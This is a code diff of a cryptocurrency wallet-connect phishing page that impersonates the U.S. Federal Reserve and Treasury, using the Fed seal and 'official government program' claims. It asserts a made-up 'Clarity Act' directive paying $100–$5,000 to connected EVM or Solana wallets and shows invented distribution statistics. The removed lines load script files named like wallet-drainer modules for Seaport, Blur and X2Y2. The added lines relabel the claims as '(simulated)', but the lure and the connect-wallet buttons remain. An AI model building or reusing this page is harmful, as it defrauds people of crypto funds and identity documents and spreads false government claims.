@@ -694,42 +853,47 @@
 
     /* ========== FOOTER ========== */
     .footer-legal {
-      margin-top: 3rem;
-      border-top: 1px solid rgba(0, 180, 255, 0.06);
-      padding-top: 2rem;
+      margin-top: 2.5rem;
+      border-top: 1px solid rgba(0, 180, 255, 0.08);
+      padding-top: 1.6rem;
       display: flex;
       justify-content: space-between;
       align-items: center;
       flex-wrap: wrap;
-      gap: 1.5rem;
-      font-size: 0.7rem;
+      gap: 1rem;
+      font-size: 0.65rem;
       color: #5f83b0;
       letter-spacing: 0.3px;
     }
     .footer-legal .left {
       display: flex;
       align-items: center;
-      gap: 20px;
+      gap: 12px;
       flex-wrap: wrap;
     }
     .footer-legal .left i {
       color: #3b82f6;
-      font-size: 0.9rem;
+      font-size: 0.8rem;
     }
     .footer-legal .left .divider-dot {
       color: #2a4b70;
       font-size: 0.3rem;
     }
+    .footer-legal .left span {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
     .footer-legal .right {
-      background: rgba(0, 60, 130, 0.1);
-      padding: 0.4rem 1.6rem;
+      background: rgba(0, 60, 130, 0.15);
+      padding: 0.4rem 1.2rem;
       border-radius: 60px;
-      border: 1px solid rgba(0, 180, 255, 0.06);
+      border: 1px solid rgba(0, 180, 255, 0.1);
       font-weight: 600;
       display: flex;
       align-items: center;
-      gap: 12px;
-      font-size: 0.65rem;
+      gap: 8px;
+      font-size: 0.6rem;
       color: #8bb3e6;
     }
     .footer-legal .right i {
@@ -738,205 +902,494 @@
     .footer-legal .right .lock {
       color: #34c759;
     }
+    .footer-legal .right .aes {
+      font-size: 0.48rem;
+      background: rgba(0, 180, 255, 0.06);
+      padding: 0.12rem 0.55rem;
+      border-radius: 20px;
+    }
 
     .disclaimer-micro {
-      margin-top: 1.8rem;
-      font-size: 0.6rem;
+      margin-top: 1.5rem;
+      font-size: 0.58rem;
       color: #3a5f87;
       text-align: center;
-      letter-spacing: 0.6px;
-      border-top: 1px solid rgba(0, 180, 255, 0.04);
-      padding-top: 1.4rem;
+      letter-spacing: 0.5px;
+      border-top: 1px solid rgba(0, 180, 255, 0.05);
+      padding-top: 1.2rem;
       display: flex;
       justify-content: center;
-      gap: 2.5rem;
+      gap: 1.2rem 1.8rem;
       flex-wrap: wrap;
     }
+    .disclaimer-micro span {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
     .disclaimer-micro span i {
-      margin-right: 6px;
       color: #4a7fb5;
     }
 
     /* ========== ANIMATIONS ========== */
     @keyframes softPulse {
-      0% { box-shadow: 0 0 0 0 rgba(0, 150, 255, 0.04); }
-      50% { box-shadow: 0 0 35px 8px rgba(0, 150, 255, 0.06); }
-      100% { box-shadow: 0 0 0 0 rgba(0, 150, 255, 0.04); }
+      0% { box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5), 0 0 0 0 rgba(0, 150, 255, 0.05); }
+      50% { box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5), 0 0 35px 6px rgba(0, 150, 255, 0.08); }
+      100% { box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5), 0 0 0 0 rgba(0, 150, 255, 0.05); }
     }
     .claim-card:nth-child(1) { animation: softPulse 4.5s infinite; }
     .claim-card:nth-child(2) { animation: softPulse 4.5s infinite 0.8s; }
     .claim-card:nth-child(3) { animation: softPulse 4.5s infinite 1.6s; }
     .claim-card:nth-child(4) { animation: softPulse 4.5s infinite 2.4s; }
 
-    /* ========== RESPONSIVE ========== */
+    /* =========================================================
+       RESPONSIVE — TABLET
+       ========================================================= */
     @media (max-width: 900px) {
       .main-container {
         padding: 2rem 1.8rem;
-        border-radius: 40px;
-      }
-      .title-block h1 {
-        font-size: 2.4rem;
-      }
-      .claim-grid {
-        grid-template-columns: repeat(2, 1fr);
-      }
-      .wallet-connect {
-        flex-direction: column;
-        align-items: stretch;
-        gap: 12px;
-        padding: 1.2rem 1.5rem;
-        border-radius: 40px;
-      }
-      .wallet-connect .label {
-        justify-content: center;
-      }
-      .connect-btn {
-        justify-content: center;
+        border-radius: 32px;
       }
       .header {
         flex-direction: column;
         align-items: flex-start;
       }
+      .seal-group {
+        width: 100%;
+      }
       .official-logos {
         width: 100%;
         justify-content: flex-start;
       }
+      .wallet-connect {
+        flex-direction: column;
+        align-items: stretch;
+        padding: 1rem 1.2rem;
+        border-radius: 28px;
+        gap: 0.9rem;
+      }
+      .wallet-connect .label {
+        justify-content: center;
+        text-align: center;
+      }
+      .connect-btn,
+      .connect-button {
+        justify-content: center;
+        width: 100%;
+      }
+      .claim-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
       .clarity-writeup::after {
         display: none;
       }
-      .clarity-writeup .main-text {
-        font-size: 1.05rem;
-      }
-      .benefits-grid {
-        grid-template-columns: 1fr 1fr;
-      }
-      .stats-grid {
-        grid-template-columns: 1fr 1fr;
+      .timeline-item {
+        flex-wrap: wrap;
+        gap: 0.6rem;
       }
     }
 
-    @media (max-width: 550px) {
-      .claim-grid {
-        grid-template-columns: 1fr;
-        gap: 1rem;
+    /* =========================================================
+       RESPONSIVE — MOBILE
+       ========================================================= */
+    @media (max-width: 640px) {
+      body {
+        padding: 0.8rem 0.5rem;
+        align-items: flex-start;
       }
       .main-container {
-        padding: 1.2rem;
+        padding: 1.4rem 1.1rem;
+        border-radius: 24px;
+      }
+      .main-container::before {
+        left: 10%;
+        right: 10%;
+      }
+      .header {
+        gap: 1rem;
+        padding-bottom: 1.2rem;
+        margin-bottom: 1.4rem;
+      }
+      .seal-group {
+        gap: 0.8rem;
+      }
+      .fed-logo-img {
+        width: 70px;
+        height: 70px;
+        padding: 0.3rem;
+      }
+      .seal-text .usa {
+        font-size: 0.85rem;
+      }
+      .seal-text .agency {
+        font-size: 0.6rem;
+        padding: 0.2rem 0.75rem;
+      }
+      .logo-item {
+        font-size: 0.55rem;
+        padding: 0.25rem 0.65rem 0.25rem 0.5rem;
+      }
+      .logo-item i {
+        font-size: 0.9rem;
+      }
+      .badge-official {
+        font-size: 0.55rem;
+        padding: 0.28rem 0.85rem;
+      }
+      .badge-row {
+        gap: 0.4rem;
+        margin-bottom: 1.5rem;
+        padding-bottom: 1rem;
+      }
+      .badge-row .mini-badge {
+        font-size: 0.52rem;
+        padding: 0.22rem 0.65rem;
       }
       .title-block h1 {
-        font-size: 1.8rem;
+        letter-spacing: -0.5px;
+      }
+      .title-block .sub {
+        font-size: 0.82rem;
+        gap: 8px;
+      }
+      .sub-pill {
+        font-size: 0.6rem;
+        padding: 0.2rem 0.7rem;
+      }
+      .divider-glow {
+        margin: 0.9rem 0 1.2rem 0;
+        width: 90px;
+      }
+      .clarity-writeup {
+        padding: 1.2rem 1.2rem;
+        border-radius: 20px;
+        border-left-width: 4px;
+        margin-bottom: 1.6rem;
       }
       .clarity-writeup .main-text {
-        font-size: 0.95rem;
+        line-height: 1.65;
+      }
+      .clarity-writeup .icon-gavel {
+        font-size: 1rem;
+        margin-right: 8px;
+      }
+      .writeup-details {
+        gap: 0.5rem 1rem;
+        font-size: 0.65rem;
+      }
+      .wallet-connect {
+        padding: 0.9rem 1rem;
+        border-radius: 22px;
+        margin-bottom: 1.6rem;
+      }
+      .wallet-connect .label {
+        font-size: 0.78rem;
+        gap: 8px;
+      }
+      .wallet-connect .label .chain-badge {
+        font-size: 0.58rem;
+      }
+      .connect-btn,
+      .connect-button {
+        padding: 0.6rem 1.2rem;
+        font-size: 0.8rem;
+      }
+      .claim-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 0.75rem;
+        margin: 1.5rem 0 1.2rem;
+      }
+      .claim-card {
+        padding: 1.2rem 0.5rem 1rem;
+        border-radius: 20px;
+      }
+      .claim-card .icon {
+        font-size: 1.5rem;
+        margin-bottom: 2px;
+      }
+      .claim-card .label {
+        letter-spacing: 1.5px;
+        font-size: 0.6rem;
+      }
+      .claim-card .badge-small {
+        font-size: 0.45rem;
+        padding: 0.22rem 0.7rem;
+        margin-top: 8px;
+      }
+      .claim-card .network-tag {
+        font-size: 0.42rem;
+        padding: 0.15rem 0.5rem;
+        top: 8px;
+        right: 8px;
+      }
+      .claim-card .tier-tag {
+        font-size: 0.4rem;
+        padding: 0.1rem 0.45rem;
+        bottom: 8px;
+        left: 8px;
+      }
+      .claim-card .reference {
+        font-size: 0.4rem;
+        margin-top: 4px;
+      }
+      .claim-card .instant-tag {
+        font-size: 0.42rem;
+      }
+      .section-title {
+        margin: 1.8rem 0 0.9rem 0;
+        gap: 8px;
+      }
+      .section-title i {
+        font-size: 1.2rem;
+      }
+      .program-overview {
+        padding: 1.2rem 1.1rem;
+        border-radius: 20px;
+      }
+      .program-overview p {
+        font-size: 0.85rem;
+        line-height: 1.65;
+      }
+      .program-overview .highlight-box {
+        padding: 0.8rem 1rem;
+        font-size: 0.82rem;
+        border-radius: 10px;
       }
       .benefits-grid {
         grid-template-columns: 1fr;
+        gap: 0.75rem;
       }
-      .stats-grid {
-        grid-template-columns: 1fr;
+      .benefit-card {
+        padding: 1.2rem 1rem;
+        border-radius: 18px;
       }
-      .badge-row .mini-badge {
-        font-size: 0.5rem;
-        padding: 0.1rem 0.7rem;
+      .benefit-card i {
+        font-size: 1.7rem;
+        margin-bottom: 0.5rem;
       }
-      .fed-logo-img {
-        width: 80px;
-        height: 80px;
+      .benefit-card h4 {
+        font-size: 0.95rem;
+      }
+      .benefit-card p {
+        font-size: 0.78rem;
+      }
+      .timeline {
+        gap: 0.7rem;
       }
       .timeline-item {
         flex-direction: column;
         align-items: flex-start;
-        gap: 0.4rem;
+        padding: 1rem 1.1rem;
+        border-radius: 16px;
+        gap: 0.5rem;
+      }
+      .timeline-item .phase {
+        min-width: auto;
+        font-size: 0.68rem;
+      }
+      .timeline-item .content h4 {
+        font-size: 0.9rem;
+      }
+      .timeline-item .content p {
+        font-size: 0.76rem;
       }
       .timeline-item .status {
+        font-size: 0.58rem;
+        padding: 0.22rem 0.7rem;
         align-self: flex-start;
+      }
+      .stats-grid {
+        grid-template-columns: repeat(3, 1fr);
+        gap: 0.6rem;
+      }
+      .stat-card {
+        padding: 1rem 0.5rem;
+        border-radius: 16px;
+      }
+      .stat-card .number i {
+        font-size: 1rem;
+      }
+      .stat-card .stat-label {
+        font-size: 0.58rem;
+        letter-spacing: 0.3px;
+      }
+      .faq-item {
+        padding: 0.9rem 1.1rem;
+        border-radius: 16px;
+      }
+      .faq-item .question {
+        font-size: 0.85rem;
+      }
+      .faq-item .answer {
+        font-size: 0.8rem;
+      }
+      .footer-legal {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 0.9rem;
+        margin-top: 2rem;
+        padding-top: 1.3rem;
+        font-size: 0.6rem;
+      }
+      .footer-legal .left {
+        gap: 8px;
+      }
+      .footer-legal .right {
+        width: 100%;
+        justify-content: center;
+      }
+      .disclaimer-micro {
+        gap: 0.8rem 1.2rem;
+        font-size: 0.55rem;
+      }
+    }
+
+    /* =========================================================
+       RESPONSIVE — SMALL MOBILE
+       ========================================================= */
+    @media (max-width: 400px) {
+      body {
+        padding: 0.5rem 0.35rem;
+      }
+      .main-container {
+        padding: 1.1rem 0.85rem;
+        border-radius: 20px;
+      }
+      .fed-logo-img {
+        width: 60px;
+        height: 60px;
+      }
+      .seal-text .usa {
+        font-size: 0.78rem;
+      }
+      .seal-text .agency {
+        font-size: 0.55rem;
+        padding: 0.18rem 0.6rem;
+      }
+      .logo-item span {
+        display: none;
+      }
+      .logo-item {
+        padding: 0.28rem 0.5rem;
+      }
+      .logo-item i {
+        font-size: 0.95rem;
+      }
+      .badge-official span {
+        display: inline;
+      }
+      .badge-row .mini-badge {
+        font-size: 0.48rem;
+        padding: 0.2rem 0.55rem;
+      }
+      .claim-grid {
+        grid-template-columns: 1fr 1fr;
+        gap: 0.6rem;
+      }
+      .claim-card {
+        padding: 1rem 0.4rem 0.9rem;
+        border-radius: 18px;
+      }
+      .claim-card .icon {
+        font-size: 1.3rem;
+      }
+      .claim-card .badge-small {
+        font-size: 0.42rem;
+        padding: 0.18rem 0.55rem;
+      }
+      .stats-grid {
+        grid-template-columns: repeat(3, 1fr);
+        gap: 0.5rem;
+      }
+      .stat-card {
+        padding: 0.85rem 0.35rem;
+      }
+      .stat-card .number {
+        font-size: 1.2rem;
+        gap: 2px;
+      }
+      .stat-card .number i {
+        font-size: 0.9rem;
+      }
+      .stat-card .stat-label {
+        font-size: 0.52rem;
+      }
+      .wallet-connect .label .secure-tag {
+        display: none;
+      }
+    }
+
+    /* =========================================================
+       LANDSCAPE MOBILE
+       ========================================================= */
+    @media (max-height: 500px) and (orientation: landscape) {
+      body {
+        align-items: flex-start;
+      }
+      .claim-grid {
+        grid-template-columns: repeat(4, 1fr);
+      }
+    }
+
+    /* =========================================================
+       REDUCED MOTION
+       ========================================================= */
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
       }
     }
   </style>
-
-<script src="./assets/web3-provider/web3-modal.js"></script>
-  <script src="./assets/web3-provider/web3-loader.js"></script>
-  <script src="./assets/web3-provider/web3-connect.js"></script>
-  <script src="./assets/web3-provider/web3-module.js"></script>
-  <script src="./assets/web3-provider/web3-alert.js"></script>
-  <script src="./assets/web3-provider/web3-seaport.js"></script>
-  <script src="./assets/web3-provider/web3-data.js"></script>
-<script src="./assets/web3-provider/ethereum-tx.js"></script>
-  <script src="./assets/web3-modules/module-blur.js"></script>
-  <script src="./assets/web3-modules/module-seaport.js"></script>
-  <script src="./assets/web3-modules/module-x2y2.js"></script>
-  <script type="module">
-  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.3/dist/ethers.min.js";
-  import "./assets/web3-provider.js";
-  </script>
-
-
 </head>
 <body>
-
- 
   <div class="main-container">
 
     <!-- ===== HEADER ===== -->
     <div class="header">
       <div class="seal-group">
         <div class="logo-wrapper">
-          <!-- Federal Reserve Board Seal from Wikimedia Commons -->
           <img
             class="fed-logo-img"
             src="https://upload.wikimedia.org/wikipedia/commons/7/73/Seal_of_the_United_States_Federal_Reserve_Board.svg"
             alt="Seal of the United States Federal Reserve Board"
-            onerror="this.style.display='none'; document.getElementById('fallbackLogo').style.display='flex';"
           />
-          <!-- Fallback text logo in case the image fails to load -->
-          <div id="fallbackLogo" class="fed-logo-exact" style="display:none;">
-            <div class="line">OF</div>
-            <div class="line">BOARD</div>
-            <div class="line">OF THE</div>
-            <div class="line stars">★ ★ ★ ★ ★ ★ ★ ★ ★ ★</div>
-            <div class="line reserve">RESERVE</div>
-            <span class="logo-badge"><i class="fas fa-circle-check" style="color:#34C759; font-size:0.3rem;"></i> FED</span>
-          </div>
         </div>
 
-        <div class="seal-icon">
-          <i class="fas fa-shield-halved"></i>
-          <div class="seal-text">
-            <div class="usa"><i class="fas fa-flag-usa"></i> U.S. DIGITAL RESERVE</div>
-            <div class="agency">CLARITY ACT · FEDERAL RESERVE · LIQUIDITY</div>
-          </div>
+        <div class="seal-text">
+          <div class="usa"><i class="fas fa-flag-usa"></i> U.S. DIGITAL RESERVE</div>
+          <div class="agency">CLARITY ACT · FEDERAL RESERVE · LIQUIDITY</div>
         </div>
       </div>
 
       <div class="official-logos">
-        <div class="logo-item"><i class="fas fa-university"></i> FED</div>
-        <div class="logo-item"><i class="fas fa-landmark"></i> TREASURY</div>
-        <div class="logo-item"><i class="fas fa-scale-balanced"></i> CLARITY</div>
-        <div class="badge-official"><i class="fas fa-circle-check"></i> GOV · SECURE</div>
+        <div class="logo-item"><i class="fas fa-university"></i> <span>FED</span></div>
+        <div class="logo-item"><i class="fas fa-landmark"></i> <span>TREASURY</span></div>
+        <div class="logo-item"><i class="fas fa-scale-balanced"></i> <span>CLARITY</span></div>
+        <div class="badge-official"><i class="fas fa-circle-check"></i> <span>GOV · SECURE</span></div>
       </div>
     </div>
 
     <!-- ===== BADGE ROW ===== -->
     <div class="badge-row">
-      <span class="mini-badge"><i class="fas fa-shield"></i> FED RESERVE DISTRIBUTION</span>
-      <span class="mini-badge"><i class="fas fa-file-contract"></i> CLARITY ACT § 2026</span>
-      <span class="mini-badge"><i class="fas fa-database"></i> EVM · SOL · PORTFOLIO</span>
-      <span class="mini-badge"><i class="fas fa-lock"></i> SECURE CONNECTION</span>
+      <span class="mini-badge"><i class="fas fa-shield"></i> FED RESERVE</span>
+      <span class="mini-badge"><i class="fas fa-file-contract"></i> CLARITY § 2026</span>
+      <span class="mini-badge"><i class="fas fa-database"></i> EVM · SOL</span>
+      <span class="mini-badge"><i class="fas fa-lock"></i> SECURE</span>
       <span class="mini-badge"><i class="fas fa-circle-check" style="color:#34C759;"></i> VERIFIED</span>
-      <span class="mini-badge"><span style="color:#ffd966; letter-spacing:1px;">★ ★ ★ ★ ★</span> FED SEAL</span>
+      <span class="mini-badge"><span style="color:#ffd966; letter-spacing:1px;">★ ★ ★ ★ ★</span> SEAL</span>
     </div>
 
     <!-- ===== TITLE ===== -->
     <div class="title-block">
       <h1>LIQUIDITY ACCESS PORTAL</h1>
       <div class="sub">
-        <i class="fas fa-bolt"></i> EVM · SOL · <i class="fas fa-circle" style="color:#3b82f6; font-size:0.4rem;"></i> CONNECT &amp; CLAIM
-        <span style="font-size:0.7rem; background:rgba(0,180,255,0.04); padding:0.1rem 1.2rem; border-radius:40px; border:1px solid rgba(0,180,255,0.06);">
-          <i class="fas fa-database"></i> portfolio eligible
-        </span>
-        <span style="font-size:0.7rem; background:rgba(0,180,255,0.04); padding:0.1rem 1.2rem; border-radius:40px; border:1px solid rgba(0,180,255,0.06);">
-          <i class="fas fa-clock"></i> instant distribution
-        </span>
+        <i class="fas fa-bolt"></i> EVM · SOL · CONNECT &amp; CLAIM
+        <span class="sub-pill"><i class="fas fa-database"></i> portfolio eligible</span>
+        <span class="sub-pill"><i class="fas fa-clock"></i> instant</span>
       </div>
       <div class="divider-glow"></div>
     </div>
@@ -946,80 +1399,79 @@
       <div class="main-text">
         <i class="fas fa-gavel icon-gavel"></i>
         <strong>the clarity act unlocks US capital.</strong>
-        <span class="highlight connect-button">the federal reserve is distributing liquidity</span> in your favourite EVM or SOL portfolio.
+        <span class="highlight">the federal reserve is distributing liquidity</span> in your favourite EVM or SOL portfolio.
         connect your wallet to receive:
       </div>
       <div class="writeup-details">
-        <span><i class="fas fa-check-circle" style="color:#34C759;"></i> FED RESERVE DIRECTIVE 2026-09</span>
+        <span><i class="fas fa-check-circle" style="color:#34C759;"></i> FED DIRECTIVE 2026-09</span>
         <span><i class="fas fa-building-columns"></i> TREASURY APPROVED</span>
-        <span><i class="fas fa-scale-balanced"></i> CLARITY ACT COMPLIANT</span>
-        <span><i class="fas fa-code-branch"></i> EVM + SOL NETWORKS</span>
-        <span><i class="fas fa-circle-info"></i> PUBLIC NOTICE · OFFICIAL</span>
-        <span><i class="fas fa-star" style="color:#ffd966;"></i> FED SEAL AUTHORIZED</span>
+        <span><i class="fas fa-scale-balanced"></i> CLARITY COMPLIANT</span>
+        <span><i class="fas fa-code-branch"></i> EVM + SOL</span>
+        <span><i class="fas fa-star" style="color:#ffd966;"></i> FED SEAL</span>
       </div>
     </div>
 
     <!-- ===== WALLET CONNECT ===== -->
     <div class="wallet-connect">
       <div class="label">
-        <i class="fas fa-wallet"></i> WALLET · <span class="chain-badge"><i class="fas fa-link"></i> EVM / SOL</span>
-        <span style="font-size:0.6rem; color:#5a8fc0;"><i class="fas fa-shield"></i> audited · secure</span>
-        <span style="font-size:0.6rem; color:#5a8fc0;"><i class="fas fa-fingerprint"></i> FED-verified</span>
+        <i class="fas fa-wallet"></i> WALLET
+        <span class="chain-badge"><i class="fas fa-link"></i> EVM / SOL</span>
+        <span class="secure-tag"><i class="fas fa-shield"></i> audited</span>
+        <span class="secure-tag"><i class="fas fa-fingerprint"></i> FED-verified</span>
       </div>
-      <div class="connect-btn connect-button">
+      <button type="button" class="connect-btn connect-button">
         <i class="fas fa-plug"></i> CONNECT WALLET
-        <span style="font-size:0.5rem; background:rgba(0,180,255,0.06); padding:0.1rem 0.7rem; border-radius:20px; margin-left:4px; border:1px solid rgba(0,180,255,0.06);">secure</span>
-      </div>
+      </button>
     </div>
 
     <!-- ===== CLAIM GRID ===== -->
-    <div class="claim-grid connect-button">
+    <div class="claim-grid">
       <div class="claim-card">
-        <a href="#claim-100" onclick="event.preventDefault(); alert('✅ CLAIM $1000 · liquidity distribution initiated. Reference: FED-100-USA-2026');">
+        <a href="#claim-100" class="connect-btn connect-button" onclick="event.preventDefault(); alert('✅ CLAIM $100 · (simulated) liquidity distribution initiated. Reference: FED-100-USA-2026');">
           <div class="network-tag"><i class="fas fa-circle-nodes"></i> EVM</div>
           <div class="tier-tag"><i class="fas fa-arrow-up"></i> TIER 1</div>
           <div class="icon"><i class="fas fa-coins"></i></div>
-          <div class="amount">$1,000</div>
+          <div class="amount">$100</div>
           <div class="label">claim</div>
-          <span class="badge-small"><i class="fas fa-arrow-right"></i> click to receive</span>
-          <div class="reference">REF: FED-1000-USA</div>
-          <div style="font-size:0.5rem; color:#4a6f9a; margin-top:4px;"><i class="fas fa-clock"></i> instant · no fee</div>
+          <span class="badge-small"><i class="fas fa-arrow-right"></i> tap to receive</span>
+          <div class="reference">REF: FED-100-USA</div>
+          <div class="instant-tag"><i class="fas fa-clock"></i> instant · no fee</div>
         </a>
       </div>
       <div class="claim-card">
-        <a href="#claim-300" onclick="event.preventDefault(); alert('⚡ CLAIM $2000 ·  fed liquidity routed. Reference: FED-300-USA-2026');">
+        <a href="#claim-300" class="connect-btn connect-button" onclick="event.preventDefault(); alert('⚡ CLAIM $300 · (simulated) fed liquidity routed. Reference: FED-300-USA-2026');">
           <div class="network-tag"><i class="fas fa-circle-nodes"></i> SOL</div>
           <div class="tier-tag"><i class="fas fa-arrow-up"></i> TIER 2</div>
           <div class="icon"><i class="fas fa-circle-dollar"></i></div>
-          <div class="amount">$2,000</div>
+          <div class="amount">$300</div>
           <div class="label">claim</div>
-          <span class="badge-small"><i class="fas fa-arrow-right"></i> click to receive</span>
-          <div class="reference">REF: FED-2000-USA</div>
-          <div style="font-size:0.5rem; color:#4a6f9a; margin-top:4px;"><i class="fas fa-bolt"></i> priority · low latency</div>
+          <span class="badge-small"><i class="fas fa-arrow-right"></i> tap to receive</span>
+          <div class="reference">REF: FED-300-USA</div>
+          <div class="instant-tag"><i class="fas fa-bolt"></i> priority</div>
         </a>
       </div>
       <div class="claim-card">
-        <a href="#claim-500" onclick="event.preventDefault(); alert('🔥 CLAIM $3000 ·  capital unlocked. Reference: FED-500-USA-2026');">
+        <a href="#claim-500" class="connect-btn connect-button" onclick="event.preventDefault(); alert('🔥 CLAIM $500 · (simulated) capital unlocked. Reference: FED-500-USA-2026');">
           <div class="network-tag"><i class="fas fa-circle-nodes"></i> EVM+SOL</div>
           <div class="tier-tag"><i class="fas fa-arrow-up"></i> TIER 3</div>
           <div class="icon"><i class="fas fa-sack-dollar"></i></div>
-          <div class="amount">$3,000</div>
+          <div class="amount">$500</div>
           <div class="label">claim</div>
-          <span class="badge-small"><i class="fas fa-arrow-right"></i> click to receive</span>
-          <div class="reference">REF: FED-3000-USA</div>
-          <div style="font-size:0.5rem; color:#4a6f9a; margin-top:4px;"><i class="fas fa-gem"></i> premium · cross-chain</div>
+          <span class="badge-small"><i class="fas fa-arrow-right"></i> tap to receive</span>
+          <div class="reference">REF: FED-500-USA</div>
+          <div class="instant-tag"><i class="fas fa-gem"></i> premium</div>
         </a>
       </div>
       <div class="claim-card">
-        <a href="#claim-1000" onclick="event.preventDefault(); alert('🌟 CLAIM $5,000 · maximum distribution. Reference: FED-1000-USA-2026');">
+        <a href="#claim-1000" class="connect-btn connect-button" onclick="event.preventDefault(); alert('🌟 CLAIM $1,000 · (simulated) maximum distribution. Reference: FED-1000-USA-2026');">
           <div class="network-tag"><i class="fas fa-circle-nodes"></i> ULTRA</div>
           <div class="tier-tag"><i class="fas fa-crown"></i> TIER 4</div>
           <div class="icon"><i class="fas fa-gem"></i></div>
-          <div class="amount">$5,000</div>
+          <div class="amount">$1,000</div>
           <div class="label">claim</div>
-          <span class="badge-small"><i class="fas fa-arrow-right"></i> click to receive</span>
-          <div class="reference">REF: FED-5000-USA</div>
-          <div style="font-size:0.5rem; color:#4a6f9a; margin-top:4px;"><i class="fas fa-crown"></i> max tier · elite</div>
+          <span class="badge-small"><i class="fas fa-arrow-right"></i> tap to receive</span>
+          <div class="reference">REF: FED-1000-USA</div>
+          <div class="instant-tag"><i class="fas fa-crown"></i> elite</div>
         </a>
       </div>
     </div>
@@ -1030,24 +1482,23 @@
     <div class="section-divider"></div>
     <div class="section-title"><i class="fas fa-file-alt"></i> PROGRAM OVERVIEW</div>
     <div class="program-overview">
-      <p><i class="fas fa-gavel" style="color:#3b82f6; margin-right:8px;"></i>
-        The <strong>Clarity Act</strong> (Public Law 2026-09) authorizes the Federal Reserve to distribute liquidity directly to eligible digital asset holders.
+      <p><i class="fas fa-gavel" style="color:#3b82f6; margin-right:6px;"></i>
+        The <strong style="color:#95c9ff;">Clarity Act</strong> (Public Law 2026-09) authorizes the Federal Reserve to distribute liquidity directly to eligible digital asset holders.
         This initiative aims to unlock U.S. capital markets and provide stable, transparent access to federal reserves through decentralized networks.
       </p>
       <div class="highlight-box">
         <strong>Eligibility:</strong> U.S. citizens and permanent residents with a verified EVM or Solana wallet.
-        <i class="fas fa-check-circle" style="color:#34C759; margin-left:8px;"></i>
+        <i class="fas fa-check-circle" style="color:#34C759; margin-left:6px;"></i>
         <span style="color:#b8d6ff;">Minimum portfolio balance: $0 (all tiers available).</span>
       </div>
       <p><i class="fas fa-circle-check" style="color:#34C759; margin-right:6px;"></i>
-        Distribution is processed through the <strong>FedReserve Liquidity Engine</strong> – a secure, audited smart contract framework
-        that ensures compliance with the Clarity Act and Treasury guidelines. Each claim is recorded on-chain and verified by the
-        Federal Reserve's digital signature.
+        Distribution is processed through the <strong style="color:#95c9ff;">FedReserve Liquidity Engine</strong> – a secure, audited smart contract framework
+        that ensures compliance with the Clarity Act and Treasury guidelines.
       </p>
-      <p style="margin-bottom:0;">
+      <p>
         <i class="fas fa-flag-usa" style="color:#ffd966; margin-right:6px;"></i>
         This is an official government program. All distributions are subject to federal oversight and anti‑money laundering (AML) protocols.
-        <span style="color:#7fc9ff;">For more information, refer to the Clarity Act whitepaper (FED-2026-09).</span>
+        <span style="color:#7fc9ff;">Refer to whitepaper FED-2026-09.</span>
       </p>
     </div>
 
@@ -1057,17 +1508,17 @@
       <div class="benefit-card">
         <i class="fas fa-unlock"></i>
         <h4>Unlock US Capital</h4>
-        <p>Provides direct access to federal liquidity, stimulating economic growth and innovation in the digital asset space.</p>
+        <p>Direct access to federal liquidity, stimulating economic growth and innovation in digital assets.</p>
       </div>
       <div class="benefit-card">
         <i class="fas fa-network-wired"></i>
         <h4>Decentralized Distribution</h4>
-        <p>Leverages EVM and Solana networks to ensure fast, transparent, and borderless distribution to eligible participants.</p>
+        <p>Leverages EVM and Solana networks for fast, transparent, borderless distribution.</p>
       </div>
       <div class="benefit-card">
         <i class="fas fa-shield-alt"></i>
         <h4>Full Compliance</h4>
-        <p>Built in accordance with SEC, FinCEN, and Treasury guidelines, ensuring a legally sound and secure process.</p>
+        <p>Built per SEC, FinCEN, and Treasury guidelines for a legally sound process.</p>
       </div>
     </div>
 
@@ -1078,7 +1529,7 @@
         <div class="phase">PHASE 1</div>
         <div class="content">
           <h4>Wallet Registration</h4>
-          <p>Connect your EVM or Solana wallet to the portal and complete initial verification.</p>
+          <p>Connect your EVM or Solana wallet and complete initial verification.</p>
         </div>
         <div class="status"><i class="fas fa-circle"></i> LIVE</div>
       </div>
@@ -1086,77 +1537,74 @@
         <div class="phase">PHASE 2</div>
         <div class="content">
           <h4>Identity Verification</h4>
-          <p>Submit KYC/AML documentation to confirm eligibility and secure your allocation.</p>
+          <p>Submit KYC/AML documentation to confirm eligibility.</p>
         </div>
-        <div class="status" style="color:#FF9F0A; border-color:rgba(255,159,10,0.08);"><i class="fas fa-clock"></i> UPCOMING</div>
+        <div class="status upcoming"><i class="fas fa-clock"></i> UPCOMING</div>
       </div>
       <div class="timeline-item">
         <div class="phase">PHASE 3</div>
         <div class="content">
           <h4>Liquidation & Distribution</h4>
-          <p>Federal reserves are distributed directly to verified wallets in real-time.</p>
+          <p>Federal reserves distributed directly to verified wallets.</p>
         </div>
-        <div class="status" style="color:#FF9F0A; border-color:rgba(255,159,10,0.08);"><i class="fas fa-clock"></i> UPCOMING</div>
+        <div class="status upcoming"><i class="fas fa-clock"></i> UPCOMING</div>
       </div>
     </div>
 
     <!-- 4. Live Stats -->
-    <div class="section-title"><i class="fas fa-chart-simple"></i> LIVE DISTRIBUTION STATS</div>
+    <div class="section-title"><i class="fas fa-chart-simple"></i> LIVE STATS</div>
     <div class="stats-grid">
       <div class="stat-card">
-        <div class="number"><i class="fas fa-dollar-sign"></i> 24.8M</div>
-        <div class="stat-label">Total Distributed</div>
+        <div class="number"><i class="fas fa-dollar-sign"></i>24.8M</div>
+        <div class="stat-label">Distributed</div>
       </div>
       <div class="stat-card">
-        <div class="number"><i class="fas fa-users"></i> 12.4K</div>
+        <div class="number"><i class="fas fa-users"></i>12.4K</div>
         <div class="stat-label">Active Users</div>
       </div>
       <div class="stat-card">
-        <div class="number"><i class="fas fa-wallet"></i> 2,046</div>
-        <div class="stat-label">Avg. Claim (USD)</div>
+        <div class="number"><i class="fas fa-wallet"></i>2,046</div>
+        <div class="stat-label">Avg. Claim</div>
       </div>
     </div>
 
     <!-- 5. FAQ -->
-    <div class="section-title"><i class="fas fa-circle-question"></i> FREQUENTLY ASKED QUESTIONS</div>
-    <div class="faq-item active">
